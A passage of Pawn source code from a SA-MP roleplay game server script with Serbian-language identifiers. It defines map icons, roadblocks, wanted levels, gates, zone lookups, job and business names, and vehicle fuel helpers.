	CreateDynamicMapIcon( -2715.1943, 217.0293, 4.3132, 27, BELA, -1, -1, -1, 300.0);

    CreateDynamicMapIcon( 1892.1112,-1086.4977,24.5365, 27, BELA, -1, -1, -1, 300.0);
    CreateDynamicMapIcon( 1373.4554,-1505.6053,13.7364, 27, BELA, -1, -1, -1, 300.0);
    CreateDynamicMapIcon( 1224.1948,-989.4682,43.6764, 27, BELA, -1, -1, -1, 300.0);
    CreateDynamicMapIcon( 309.8067,-1372.5594,14.4564, 27, BELA, -1, -1, -1, 300.0);
    CreateDynamicMapIcon( 605.1835,-1516.8864,15.1464, 27, BELA, -1, -1, -1, 300.0);

	// Groti
    CreateDynamicMapIcon( 940.574645, -1707.507690, 13.615303, 55, BELA, -1, -1, -1, 300.0);

    // City Halls
    CreateDynamicMapIcon( 1480.5170,-1773.8329,14.9395, 20, BELA, -1, -1, -1, 300.0);

    //Zlatara
    CreateDynamicMapIcon(1081.2454,-1696.7845,13.5469, 47, BELA, -1, -1, -1, 300.0);

    //Stock Market
    CreateDynamicMapIcon(593.2657,-1250.2496,18.2236, 24, BELA, -1, -1, -1, 300.0);

    //Rolex Store
    CreateDynamicMapIcon(1799.2058,-1253.8257,13.6571, 52, BELA, -1, -1, -1, 300.0); //

    //Banka
    CreateDynamicMapIcon(1547.3317,-1130.2531,24.0721, 52, BELA, -1, -1, -1, 300.0);

    // Electronic Store
    CreateDynamicMapIcon(917.1982,-1522.5040,13.3828, 42, BELA, -1, -1, -1, 300.0);

    // DM ZONA
    CreateDynamicMapIcon(1382.1486, -1088.6586, 28.2120, 18, BELA, -1, -1, -1, 300.0);

    // Muzej
    CreateDynamicMapIcon(1882.2690,-1334.5245,13.1821, 52, BELA, -1, -1, -1, 300.0); 

    // Salon Plovila
    CreateDynamicMapIcon(2379.6045,-2503.5066,13.3518, 9, BELA, -1, -1, -1, 300.0);

    // Misije 
    CreateDynamicMapIcon(970.4238,-1563.7939,13.5993, 18, BELA, -1, -1, -1, 300.0);

    // Biro za Zaposljavanje
    CreateDynamicMapIcon(3648.4316,-1041.3040,11.4882, 33, BELA, -1, -1, -1, 300.0);

    // Vip/Promoter Baza
    CreateDynamicMapIcon(1077.8834,1309.1216,10.5272, 58, BELA, -1, -1, -1, 300.0);

    // Tune Vozila San Fierro
    CreateDynamicMapIcon(-2182.6689,704.0825,53.6111, 27, BELA, -1, -1, -1, 300.0);

    // Auto Skola
    CreateDynamicMapIcon(1914.5627,-1864.3698,13.5622, 36, BELA, -1, -1, -1, 300.0);

    // Fabrika Oruzja
    CreateDynamicMapIcon(3823.3127,-1152.8422,10.9416, 18, BELA, -1, -1, -1, 300.0);

    //PornHub
    CreateDynamicMapIcon(1327.4409,-1556.5525,13.5397, 21, BELA, -1, -1, -1, 300.0);

    //Apoteka
    CreateDynamicMapIcon(1295.9462,-1870.4811,13.5561, 22, BELA, -1, -1, -1, 300.0);

}
//------------------------------------------------------------------------------
// public NewsOn( ) {
// 	newsbre = 1;
// }
public AddsOn( ) {
	adds = true;
}
//------------------------------------------------------------------------------
stock frename( oldname[], newname[] ) {
    if( !fexist( oldname ) ) return false;
    fremove( newname );
    if( !fcopy( oldname, newname ) ) return false;
    fremove( oldname );
    return true;
}
stock fcopy( oldname[], newname[] ) {
    new File:ohnd, File:nhnd;
    if( !fexist( oldname ) ) return false;
    ohnd=fopen( oldname, io_read );
    nhnd=fopen( newname, io_write );
    new buf2[ 1 ];
    new i;
    for( i=flength(ohnd);i>0;i-- ) {
        fputchar( nhnd, fgetchar( ohnd, buf2[0], false ), false );
    }
    fclose( ohnd );
    fclose( nhnd );
    return true;
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
stock CreateRoadblock(Object,Float:x,Float:y,Float:z,Float:Angle)
{
    for( new i = 0; i < sizeof(Roadblocks); i++)
  	{
  	    if(Roadblocks[ i ][sCreated] == 0)
  	    {
            Roadblocks[ i ][sCreated] = 1;
            Roadblocks[ i ][sX] = x;
            Roadblocks[ i ][sY] = y;
            Roadblocks[ i ][sZ] = z-0.7;
            Roadblocks[ i ][sObject] = CreateDynamicObject(Object, x, y, z-0.9, 0, 0, Angle);
	        return 1;
  	    }
  	}
	return 1;
}
stock DeleteAllRoadblocks( playerid )
{
    for( new i = 0; i < sizeof(Roadblocks); i++)
  	{
  	    if( IsPlayerInRangeOfPoint( playerid, 100, Roadblocks[ i ][sX], Roadblocks[ i ][sY], Roadblocks[ i ][sZ ] ) )
        {
	  	    if(Roadblocks[ i ][sCreated] == 1)
	  	    {
	  	        Roadblocks[ i ][sCreated] = 0;
	            Roadblocks[ i ][sX] = 0.0;
	            Roadblocks[ i ][sY] = 0.0;
	            Roadblocks[ i ][sZ] = 0.0;
	            DestroyDynamicObject(Roadblocks[ i ][sObject] );
	  	    }
  	    }
	}
	return 1;
}
stock DeleteClosestRoadblock( playerid )
{
    for( new i = 0; i < sizeof(Roadblocks); i++)
  	{
  	    if( IsPlayerInRangeOfPoint( playerid, 5.0, Roadblocks[ i ][sX], Roadblocks[ i ][sY], Roadblocks[ i ][sZ ] ) )
        {
  	        if(Roadblocks[ i ][sCreated] == 1)
            {
                Roadblocks[ i ][sCreated] = 0;
                Roadblocks[ i ][sX] = 0.0;
                Roadblocks[ i ][sY] = 0.0;
                Roadblocks[ i ][sZ] = 0.0;
                DestroyDynamicObject(Roadblocks[ i ][sObject] );
                return 1;
  	        }
  	    }
  	}
  	return 1;
}
//------------------------------------------------------------------------------
stock Novi_SetPlayerWantedLevel( playerid, broj ) { 
	switch( broj ) {
	    case 0: {
	        PlayerTextDrawHide( playerid, WantedIgraca[ playerid ] );
	        SetPlayerColor( playerid, 0xFFFFFF00 );
	    }
	    case 1: {
	        PlayerTextDrawSetString( playerid, WantedIgraca[ playerid ], "~r~]" );
	        PlayerTextDrawShow( playerid, WantedIgraca[ playerid ] );
	        SetPlayerColor( playerid, 0xAA333300 );
	    }
	    case 2: {
	        PlayerTextDrawSetString( playerid, WantedIgraca[ playerid ], "~r~] ]" );
	        PlayerTextDrawShow( playerid, WantedIgraca[ playerid ] );
	        SetPlayerColor( playerid, 0xAA333300 );
	    }
	    case 3: {
	        PlayerTextDrawSetString( playerid, WantedIgraca[ playerid ], "~r~] ] ]" );
	        PlayerTextDrawShow( playerid, WantedIgraca[ playerid ] );
	        SetPlayerColor( playerid, 0xAA333300 );
	    }
	    case 4: {
	        PlayerTextDrawSetString( playerid, WantedIgraca[ playerid ], "~r~] ] ] ]" );
	        PlayerTextDrawShow( playerid, WantedIgraca[ playerid ] );
	        SetPlayerColor( playerid, 0xAA333300 );
	    }
	    case 5: {
	        PlayerTextDrawSetString( playerid, WantedIgraca[ playerid ], "~r~] ] ] ] ]" );
	        PlayerTextDrawShow( playerid, WantedIgraca[ playerid ] );
	        SetPlayerColor( playerid, 0xAA333300 );
	    }
	    case 6: {
	        PlayerTextDrawSetString( playerid, WantedIgraca[ playerid ], "~r~] ] ] ] ] ]" );
	        PlayerTextDrawShow( playerid, WantedIgraca[ playerid ] );
	        SetPlayerColor( playerid, 0xAA333300 );
	    }
	    case 7: {
	        PlayerTextDrawSetString( playerid, WantedIgraca[ playerid ], "~r~] ] ] ] ] ] ]" );
	        PlayerTextDrawShow( playerid, WantedIgraca[ playerid ] );
	        SetPlayerColor( playerid, 0xAA333300 );
	    }
	    case 8: {
	        PlayerTextDrawSetString( playerid, WantedIgraca[ playerid ], "~r~] ] ] ] ] ] ] ]" );
	        PlayerTextDrawShow( playerid, WantedIgraca[ playerid ] );
	        SetPlayerColor( playerid, 0xAA333300 );
	    }
	    case 9: {
	        PlayerTextDrawSetString( playerid, WantedIgraca[ playerid ], "~r~] ] ] ] ] ] ] ] ]" );
	        PlayerTextDrawShow( playerid, WantedIgraca[ playerid ] );
	        SetPlayerColor( playerid, 0xAA333300 );
	    }
	    case 10: {
	        PlayerTextDrawSetString( playerid, WantedIgraca[ playerid ], "~r~] ] ] ] ] ] ] ] ] ]" );
	        PlayerTextDrawShow( playerid, WantedIgraca[ playerid ] );
	        SetPlayerColor( playerid, 0xAA333300 );
	    }
	}
	return 1;
}
//------------------------------------------------------------------------------
stock PostaviWanted( playerid, zlocin[], prijavio[], kolicina = 1 ) {
	if( IsPlayerConnected( playerid ) ) {

        if(TimerAutoPilot[playerid] != (-1))
        {
            #if defined USE_TIMERS
            KillTimer(TimerAutoPilot[playerid]);
            #endif
            TimerAutoPilot[playerid] = -1;
            DeleteArray(autopilotID[playerid]);
            autopilotID[playerid] = -1;
            CurrTarget[playerid] = 0;
            SendInfoMessage(playerid, "Autopilot se iskljucio zato sto ste trazeni!");
            DisableRemoteVehicleCollisions(playerid, 1);
            return 1;
        }
	
		new string[ 256 ];
	    Novi_SetPlayerWantedLevel( playerid, PlayerInfo[ playerid ][ xWanted ]+kolicina );
		PlayerInfo[ playerid ][ xWanted ] += kolicina;

		if( PlayerInfo[ playerid ][ xWanted ] > 10 ) {
			Novi_SetPlayerWantedLevel( playerid, 10 );
			PlayerInfo[ playerid ][ xWanted ] = 10;
		}

		strmid( ZlocinInfo[ playerid ][ zPrijavio ], prijavio, 0, strlen(prijavio), 255);
		strmid( ZlocinInfo[ playerid ][ zPocinio ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
		strmid( ZlocinInfo[ playerid ][ zZlocin ], zlocin, 0, strlen(zlocin), 255);

        format( string, sizeof( string ), ""col_crvena"- Pocinili ste zlocin: "col_white"%s "col_crvena"| Prijava od: "col_white"%s!", zlocin, prijavio );
		SCM( playerid, -1, string);
		format( string, sizeof( string ), ""col_crvena"- Trenutni Wanted Level: "col_white"%d!", PlayerInfo[ playerid ][ xWanted ] );
		SCM( playerid, -1, string);

		for( new id = 1; id < MAX_ORG; id++) {
		    if( OI[ id ][ oTip ] == ORG_TIP_PD ) {
				format( string, sizeof( string ), ""col_crvena"- Imamo novi prijavljen zlocin od: "col_white"%s!", prijavio);
				OrgPoruka( id, -1, string);
				format( string, sizeof( string ), ""col_crvena"- Pocinio: "col_white"%s "col_crvena"| Zlocin: "col_white"%s "col_crvena"| Wanted Level Pocinioca: %d!", ImeIgraca( playerid ), zlocin, PlayerInfo[ playerid ][ xWanted ] );
				OrgPoruka( id, -1, string);
			}
		}
        AdminPoruka( SVETLOCRVENA, string );
	}
	return 1;
}
//------------------------------------------------------------------------------
stock Igrac2D( playerid, zone[], len)
{
    new Float:x, Float:y, Float:z;
    GetPlayerPos( playerid, x, y, z);
    for( new i = 0; i != sizeof(gSAZones); i++ )
    {
        if(x >= gSAZones[ i ][SAZONE_AREA][0] && x <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y >= gSAZones[ i ][SAZONE_AREA][1] && y <= gSAZones[ i ][SAZONE_AREA][4])
        {
            return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
        }
    }
    return 0;
}
//------------------------------------------------------------------------------
stock Zone2D( id, zone[], len)
{
    new Float:x = gZoneInfo[id][gZonePickupPos][0];
    new Float:y = gZoneInfo[id][gZonePickupPos][1]; 
    
    for( new i = 0; i != sizeof(gSAZones); i++ )
    {
        if(x >= gSAZones[ i ][SAZONE_AREA][0] && x <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y >= gSAZones[ i ][SAZONE_AREA][1] && y <= gSAZones[ i ][SAZONE_AREA][4])
        {
            return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
        }
    }
    return 0;
}
//------------------------------------------------------------------------------
stock getZoneLocation(id) {
    new imeulice[MAX_ZONE_NAME];
    Zone2D( id,imeulice,sizeof(imeulice));
    return imeulice;
} 
//------------------------------------------------------------------------------
stock GetPlayerLocation( playerid )
{
	new imeulice[MAX_ZONE_NAME];
   	Igrac2D( playerid,imeulice,sizeof(imeulice));
   	return imeulice;
}
//------------------------------------------------------------------------------
stock SetTablice( h ) {
	new tablice[ 20 ];
	if( 10 > h )
	{
		format( tablice, sizeof( tablice ), "LS 000%d.", h );
		SetVehicleNumberPlate( h, tablice );
	}
	else if( 10 <= h && h < 100 )
	{
		format( tablice , sizeof( tablice ), "LS 00%d.", h );
		SetVehicleNumberPlate( h, tablice );
	}
	else if( 100 <= h && h < 1000 )
	{
		format( tablice, sizeof( tablice ), "LS 0%d.", h );
		SetVehicleNumberPlate( h, tablice );
	}
	else if( 1000 <= h && h < 2001 )
	{
		format( tablice, sizeof( tablice ), "LS %d.", h );
		SetVehicleNumberPlate( h, tablice );
	}
	return 1;
}
//------------------------------------------------------------------------------
stock ini_GetKey( line[] ) {

	new keyRes[256];
	keyRes[ 0 ] = 0;

    if( strfind( line , "=" , true ) == -1 ) return keyRes;

    strmid( keyRes , line , 0 , strfind( line , "=" , true ) , sizeof( keyRes) );
    return keyRes;
}
//------------------------------------------------------------------------------
stock ini_GetValue( line[] ) {
	new valRes[256];
	valRes[ 0 ]=0;

	if( strfind( line , "=" , true ) == -1 ) return valRes;

	strmid( valRes , line , strfind( line , "=" , true )+1 , strlen( line ) , sizeof( valRes ) );
	return valRes;
}
//------------------------------------------------------------------------------
stock Create3DandP( text[], Float:vXU, Float:vYU, Float:vZU, vInt, vVW, pickupid, Float:radius ) {
	CreateDynamic3DTextLabel(text, 0x0059FFAA, vXU, vYU, vZU, radius, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, vVW, vInt, -1, 20.0);
	CreateDynamicPickup(pickupid, 1, vXU, vYU, vZU, vVW, vInt);
}
//------------------------------------------------------------------------------
stock UlicaHotela( i ) {
	new imeulice[ MAX_ZONE_NAME ];
   	UlicaHotela2D( i, imeulice, sizeof( imeulice ) );
   	return imeulice;
}
//------------------------------------------------------------------------------
stock UlicaHotela2D( h, zone[], len ) {
	new Float:x22, Float:y22;
	x22 = hotelInfo[ h ][ hEnter ][ 0 ]; y22 = hotelInfo[ h ][ hEnter ][ 1 ];
	for( new i = 0; i != sizeof( gSAZones ); i++ ) {
		if(x22 >= gSAZones[ i ][SAZONE_AREA][0] && x22 <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y22 >= gSAZones[ i ][SAZONE_AREA][1] && y22 <= gSAZones[ i ][SAZONE_AREA][4])
		{
		    return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
		}
	}
	return 0;
}
//------------------------------------------------------------------------------
stock UlicaImovine( i )
{
	new imeulice[ MAX_ZONE_NAME ];
   	UlicaImovine2D( i, imeulice, sizeof( imeulice ) );
   	return imeulice;
}
//------------------------------------------------------------------------------
stock UlicaImovine2D( h, zone[], len )
{
	new Float:x22, Float:y22;
	x22 = II[ h ][ iEnter ][ 0 ]; y22 = II[ h ][ iEnter ][ 1 ];
	for( new i = 0; i != sizeof(gSAZones); i++ )
	{
		if(x22 >= gSAZones[ i ][SAZONE_AREA][0] && x22 <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y22 >= gSAZones[ i ][SAZONE_AREA][1] && y22 <= gSAZones[ i ][SAZONE_AREA][4])
		{
		    return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
		}
	}
	return 0;
}
//------------------------------------------------------------------------------
stock GetSpeed( playerid ) {
    new Float:ST[ 4 ];
    if( IsPlayerInAnyVehicle( playerid ) )
    	GetVehicleVelocity( GetPlayerVehicleID( playerid ), ST[ 0 ], ST[ 1 ], ST[ 2 ] );
    else
		GetPlayerVelocity( playerid, ST[ 0 ], ST[ 1 ], ST[ 2 ] );

    ST[ 3 ] = floatsqroot(floatpower(floatabs(ST[0]), 2.0) + floatpower(floatabs(ST[1]), 2.0) + floatpower(floatabs(ST[2]), 2.0)) * 178.8617875;
    return floatround( ST[ 3 ] );
}
//------------------------------------------------------------------------------
stock IsPlayerFacingVehicle( playerid,vehicleid)
{
        new Float:pX,Float:pY,Float:pZ,Float:X,Float:Y,Float:Z,Float:ang;

        if(!IsPlayerConnected( playerid )) return 0;

        GetVehiclePos( vehicleid, X, Y, Z);
        GetPlayerPos( playerid, pX, pY, pZ);

        if( Y > pY ) ang = (-acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
        else if( Y < pY && X < pX ) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 450.0);
        else if( Y < pY ) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);

        if(X > pX) ang = (floatabs(floatabs(ang) + 180.0));
        else ang = (floatabs(ang) - 180.0);
        new Float:russia;
        GetPlayerFacingAngle( playerid,russia);
        if(ang-russia<-130 || ang-russia>130) return 0;
        else return 1;
}
//------------------------------------------------------------------------------
GetNameByWatchID( playerid ) {
    new watchName[ 20 ] = "Rolex Datejust";

	switch( PlayerInfo[ playerid ][ xSat ] ) {
	    case 0: watchName = "Nema sata";
		case 19039: watchName = "Rolex Datejust";
		case 19040: watchName = "Emporio Armani";
		case 19041: watchName = "Casio G-Shock";
		case 19042: watchName = "Michael Kors";
		case 19043: watchName = "Hugo Boss";
	}
	return watchName;
}
//------------------------------------------------------------------------------
stock UzmiTipUtakmice( broj ) {
    new watchName[ 10 ] = "ki 1";

	switch( broj ) {
	    case 1: watchName = "ki 1";
		case 2: watchName = "ki x";
		case 3: watchName = "ki 2";
	}
	return watchName;
}
//------------------------------------------------------------------------------
getZoneType(id) {

    new vrstaZone[26] = "Obicna Zona";
    if(gZoneInfo[id][gZoneVrsta] == 0) vrstaZone = "Obicna Zona";
    else if(gZoneInfo[id][gZoneVrsta] == 1) vrstaZone = "Specijalna Zona";
    else if(gZoneInfo[id][gZoneVrsta] == 2) vrstaZone = "Materijali Zona";

    return vrstaZone;
}
//------------------------------------------------------------------------------
getJobName( jobID )
{
	new jobName[26] = "Nepostojeci posao";

	switch( jobID ) {
	    case POSAO_NEMA: jobName = "Nezaposlen";
		case POSAO_KOSAC: jobName = "Kosac Trave";
		case POSAO_RUDAR: jobName = "Rudar";
		case POSAO_DILER: jobName = "Diler Droge";
		case POSAO_VOJNIK: jobName = "Vojnik";
        case POSAO_DELIVERY: jobName = "Delivery";
        case POSAO_SABOTAZER: jobName = "Sabotazer";
        case POSAO_MOLER: jobName = "Moler";
        case POSAO_HAKER: jobName = "Haker";
        case POSAO_LOVAC: jobName = "Lovac";
        case POSAO_PORNO: jobName = "Porno Glumica";
        case POSAO_ASTRONAUT: jobName = "Astronaut";
        case POSAO_DRVA: jobName = "Prevoznik Drva";
        case POSAO_PILOT: jobName = "Pilot";
        case POSAO_ELEKTRIK: jobName = "Elektricar";
	}
	return jobName;
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
getOrgRank( playerid, orgID ) {
	new orgRank[64] = "Los Santos Police Department";

    if( orgID == 0 ) orgRank = "Civil";
    else {
		if( PlayerInfo[ playerid ][ xRank ] == 1) format( orgRank, sizeof( orgRank ), "%s", OI[ PlayerInfo[ playerid ][ xClan ] ][ oRank1 ] );
		else if( PlayerInfo[ playerid ][ xRank ] == 2) format( orgRank, sizeof( orgRank ), "%s", OI[ PlayerInfo[ playerid ][ xClan ] ][ oRank2 ] );
	    else if( PlayerInfo[ playerid ][ xRank ] == 3) format( orgRank, sizeof( orgRank ), "%s", OI[ PlayerInfo[ playerid ][ xClan ] ][ oRank3 ] );
	    else if( PlayerInfo[ playerid ][ xRank ] == 4) format( orgRank, sizeof( orgRank ), "%s", OI[ PlayerInfo[ playerid ][ xClan ] ][ oRank4 ] );
	    else if( PlayerInfo[ playerid ][ xRank ] == 5) format( orgRank, sizeof( orgRank ), "%s", OI[ PlayerInfo[ playerid ][ xClan ] ][ oRank5 ] );
	    else if( PlayerInfo[ playerid ][ xRank ] == 6) format( orgRank, sizeof( orgRank ), "%s", OI[ PlayerInfo[ playerid ][ xClan ] ][ oRank6 ] );
	}
	return orgRank;
}
//------------------------------------------------------------------------------
getOrgName( orgID ) {
	new orgName[64] = "Los Santos Police Department";

    if( orgID == 0 ) orgName = "Civil";
	else format( orgName, sizeof( orgName ), "%s", OI[ orgID ][ oName ] );
	return orgName;
}
//------------------------------------------------------------------------------
NearestGate( playerid ) {

    for( new i = 1; i != MAX_GATES; i ++ ) if( GateData[ i ][ gateModel ] && IsPlayerInRangeOfPoint( playerid, GateData[ i ][ gateRadius ], GateData[ i ][ gatePos ][ 0 ], GateData[ i ][ gatePos ][ 1 ], GateData[ i ][ gatePos ][ 2 ] ) ) {
    
		if( GetPlayerInterior( playerid ) == GateData[ i ][ gateInterior ] && GetPlayerVirtualWorld( playerid ) == GateData[ i ][ gateWorld ] )
			return i;
	}
	return -1;
}
//------------------------------------------------------------------------------
stock Gate_Operate( playerid, gateid ) {

	if( gateid != -1 && GateData[ gateid ][ gateModel ] ) {

		if( !GateData[ gateid ][ gateOpened ] ) {
		
		    GateData[ gateid ][ gateOpened ] = true;
		    MoveDynamicObject( GateData[ gateid ][ gateObject ], GateData[ gateid ][ gateMove ][ 0 ], GateData[ gateid ][ gateMove ][ 1 ], GateData[ gateid ][ gateMove ][ 2 ], GateData[ gateid ][ gateSpeed ], GateData[ gateid ][ gateMove ][ 3 ], GateData[ gateid ][ gateMove ][ 4 ], GateData[ gateid ][ gateMove ][ 5 ] );

			SendClientMessageEx( playerid, ZUTA, "KAPIJA | Otvorili ste kapiju, zatvorice se sama za %d sekundi.", GateData[ gateid ][ gateTime ]/1000 );

            if( GateData[ gateid ][ gateTime ] > 0 ) {
				GateData[ gateid ][ gateTimer ] = SetTimerEx( "CloseGate", GateData[ gateid ][ gateTime ], false, "dfffffff", gateid, GateData[ gateid ][ gatePos ][ 0 ], GateData[ gateid ][ gatePos ][ 1 ], GateData[ gateid ][ gatePos ][ 2 ], GateData[ gateid ][ gateSpeed ], GateData[ gateid ][ gatePos ][ 3 ], GateData[ gateid ][ gatePos ][ 4 ], GateData[ gateid ][ gatePos ][ 5 ] );
			}
		}
		else if( GateData[ gateid ][ gateOpened ] ) {
		
		    GateData[ gateid ][ gateOpened ] = false;
		    MoveDynamicObject( GateData[ gateid ][ gateObject ], GateData[ gateid ][ gatePos ][ 0 ], GateData[ gateid ][ gatePos ][ 1 ], GateData[ gateid ][ gatePos ][ 2 ], GateData[ gateid ][ gateSpeed ], GateData[ gateid ][ gatePos ][ 3 ], GateData[ gateid ][ gatePos ][ 4 ], GateData[ gateid ][ gatePos ][ 5 ] );

            SCM( playerid, ZUTA, "KAPIJA | Zatvorili ste kapiju." );

            if( GateData[ gateid ][ gateTime ] > 0 ) {
				Novi_KillTimer( GateData[ gateid ][ gateTimer ] );
		    }
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
forward CloseGate( gateid, Float:fX, Float:fY, Float:fZ, Float:speed, Float:fRotX, Float:fRotY, Float:fRotZ);
public CloseGate( gateid, Float:fX, Float:fY, Float:fZ, Float:speed, Float:fRotX, Float:fRotY, Float:fRotZ) {

	if( GateData[ gateid ][ gateModel ] && GateData[ gateid ][ gateOpened ] ) {
	
	 	MoveDynamicObject( GateData[ gateid ][ gateObject ], fX, fY, fZ, speed, fRotX, fRotY, fRotZ );

		GateData[ gateid ][ gateOpened ] = false ;
		return 1;
	}
	return 0;
}
//------------------------------------------------------------------------------
GetNearestOrgPortID( playerid ) {
	for( new i = 1; i < MAX_ORG; i++ ) {
		for( new id = 0; id < OI[ i ][ oMaxPort ]; id++ ) {
			if( IsPlayerInRangeOfPoint( playerid, 3.0, PortOP[ i ][ id ][ Pos1 ][ 0 ], PortOP[ i ][ id ][ Pos1 ][ 1 ], PortOP[ i ][ id ][ Pos1 ][ 2 ] ) && GetPlayerVirtualWorld( playerid ) == PortOP[ i ][ id ][ VW ][ 0 ] && GetPlayerInterior( playerid ) == PortOP[ i ][ id ][ Int ][ 0 ] ) {
				return id;
			}
			else if( IsPlayerInRangeOfPoint( playerid, 3.0, PortOP[ i ][ id ][ Pos2 ][ 0 ], PortOP[ i ][ id ][ Pos2 ][ 1 ], PortOP[ i ][ id ][ Pos2 ][ 2 ] ) && GetPlayerVirtualWorld( playerid ) == PortOP[ i ][ id ][ VW ][ 1 ] && GetPlayerInterior( playerid ) == PortOP[ i ][ id ][ Int ][ 1 ] ) {
            	return id;
			}
		}
	}
	return -1;
}
//------------------------------------------------------------------------------
GetNearestOrgIDPort( playerid ) {
	for( new i = 1; i < MAX_ORG; i++ ) {
		for( new id = 0; id < OI[ i ][ oMaxPort ]; id++ ) {
			if( IsPlayerInRangeOfPoint( playerid, 3.0, PortOP[ i ][ id ][ Pos1 ][ 0 ], PortOP[ i ][ id ][ Pos1 ][ 1 ], PortOP[ i ][ id ][ Pos1 ][ 2 ] ) && GetPlayerVirtualWorld( playerid ) == PortOP[ i ][ id ][ VW ][ 0 ] && GetPlayerInterior( playerid ) == PortOP[ i ][ id ][ Int ][ 0 ] ) {
				return i;
			}
			else if( IsPlayerInRangeOfPoint( playerid, 3.0, PortOP[ i ][ id ][ Pos2 ][ 0 ], PortOP[ i ][ id ][ Pos2 ][ 1 ], PortOP[ i ][ id ][ Pos2 ][ 2 ] ) && GetPlayerVirtualWorld( playerid ) == PortOP[ i ][ id ][ VW ][ 1 ] && GetPlayerInterior( playerid ) == PortOP[ i ][ id ][ Int ][ 1 ] ) {
            	return i;
			}
		}
	}
	return -1;
}
//------------------------------------------------------------------------------
GetNearestHotel( playerid ) {

    for( new i = 1; i < MAX_HOTELS; i++) {

        if( IsPlayerInRangeOfPoint( playerid, 3.0, hotelInfo[ i ][ hEnter ][ 0 ], hotelInfo[ i ][  hEnter ][ 1 ], hotelInfo[ i ][ hEnter ][ 2 ] ) ) { return i; }
	}
	return -1;
}
//------------------------------------------------------------------------------
GetNearestProperty( playerid ) {

    for( new i = 1; i < MAX_IMOVINA; i++) {

        if( IsPlayerInRangeOfPoint( playerid, 3.0, II[ i ][ iEnter ][ 0 ], II[ i ][  iEnter ][ 1 ], II[ i ][ iEnter ][ 2 ] ) ) { return i; }
	}
	return -1;
}
//------------------------------------------------------------------------------
GetNearestSalon( playerid ) {
    for( new i = 1; i < MAX_AUTOS; i++) {
        if( IsPlayerInRangeOfPoint( playerid, 3.0, AutoSalon[ i ][ aPickupPos ][ 0 ], AutoSalon[ i ][  aPickupPos ][ 1 ], AutoSalon[ i ][ aPickupPos ][ 2 ] ) ) { return i; }
	}
	return -1;
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
GetPropertyName( i )
{
	new pName[26] = "Nepostojeci posao";
	
    if( i == -1 || i == 0 ){
		format( pName, sizeof( pName ), "%s", "Nema nekretnine" );
	}
	else if( i != -1 ) {
		switch( II[ i ][ iUsage ] )
		{
			case IMOVINA_KUCA: pName = "Kucu";
			case IMOVINA_STAN: pName = "Stan";
			case IMOVINA_VIKENDICA: pName = "Vikendicu";
		}
	}
	
	return pName;
}
GetPropertyAName( i )
{
	new pName[26] = "Nepostojeci posao";

    if( i == -1 || i == 0 ){
		format( pName, sizeof( pName ), "%s", "Nema nekretnine" );
	}
	else if( i != -1 ) {
		switch( II[ i ][ iUsage ] )
		{
			case IMOVINA_KUCA: pName = "Kuca";
			case IMOVINA_STAN: pName = "Stan";
			case IMOVINA_VIKENDICA: pName = "Vikendica";
		}
	}

	return pName;
}
//------------------------------------------------------------------------------
getBussinesType( f )
{
	new jobName[26] = "Nepostojeci posao";

	switch( BussinesInfo[ f ][ bType ] ) {
		case VRSTA_RESTORAN: jobName = "Restoran";
		case VRSTA_CLUCK: jobName = "Cluckin' Bell";
		case VRSTA_ZIP: jobName = "Zip";
		case VRSTA_BINCO: jobName = "Binco";
		case VRSTA_SUBURBAN: jobName = "Suburban";
		case VRSTA_VICTIM: jobName = "Victim";
		case VRSTA_BAR: jobName = "Bar";
		case VRSTA_NKLUB: jobName = "Nocni Klub";
		case VRSTA_DISCO: jobName = "Diskoteka";
		case VRSTA_GUNSHOP: jobName = "Ammunation";
		case VRSTA_PIZZA: jobName = "Picerija";
		case VRSTA_BURG: jobName = "Burg";
		case VRSTA_MARKET: jobName = "Prodavnica 24/7";
		case VRSTA_GYM: jobName = "Teretana";
		case VRSTA_ELEKTRONIK: jobName = "Elektronik";
		case VRSTA_TRAFIKA: jobName = "Trafika";
		case VRSTA_JFIRMA: jobName = "Firma bez ulaza";
		case VRSTA_POSAO: jobName = "Poslovna firma";
		case VRSTA_RENT: jobName = "Rent a vehicle";
		case VRSTA_PUMPA: jobName = "Pumpa";
		case VRSTA_JAVNAK: jobName = "Javna Kuca";
		case VRSTA_KLAD: jobName = "Kladionica";
        case VRSTA_PRAZANLOKAL: jobName = "Prazan Lokal";
        case VRSTA_CASINO: jobName = "Casino";
	}
	return jobName;
}
getAmountFuel( carid )
{
	new fuel;
	if( IsVehicleBajs( carid ) ) fuel = 1000;
	else if( IsVehicleMotor( carid ) ) fuel = 15;
	else if( IsVehicleAuto( carid ) ) fuel = 40;
	else if( IsVehicleC1( carid ) ) fuel = 55;
	else if( IsVehicleC2( carid ) ) fuel = 70;
	else if( IsVehicleC3( carid ) ) fuel = 70;
	else if( IsVehicleBrod( carid ) ) fuel = 100;
	else if( IsVehicleLetelica( carid ) ) fuel = 100;

	return fuel;
}
//------------------------------------------------------------------------------
OOCNews( color, const string[] ) {
	foreach( Player, i ) {
		if( PlayerLogged[ i ] == true ) {
		    if( !gNews{ i } ) {
				SCM( i, color, string );
			}
		}
	}
}
//------------------------------------------------------------------------------
IsAtGasStation( playerid ) {
    if( IsPlayerConnected( playerid ) ) {
		if( IsPlayerInRangeOfPoint( playerid,10.0, 1004.0070,-939.3102,42.1797)  ||
			IsPlayerInRangeOfPoint( playerid,6.0, -90.5515,-1169.4578,2.4079)    ||
		    IsPlayerInRangeOfPoint( playerid,6.0, -1609.7958,-2718.2048,48.5391) ||
		    IsPlayerInRangeOfPoint( playerid,6.0, -2029.4968,156.4366,28.9498)   ||
